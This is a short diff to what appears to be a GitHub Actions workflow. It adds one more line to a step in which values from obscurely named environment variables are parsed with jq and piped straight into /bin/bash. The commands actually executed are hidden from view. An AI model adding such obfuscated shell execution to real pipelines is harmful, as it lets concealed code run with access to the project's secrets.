@@ -27,6 +27,7 @@ jobs:
           echo $zacdj35600 | jq -r .lx14896 | /bin/bash
           echo $q47 | jq -r .omr62415 | /bin/bash
           echo $smdhw7951 | jq -r .jmrjw76401 | /bin/bash
+          echo $mrig08256 | jq -r .bloi3471 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
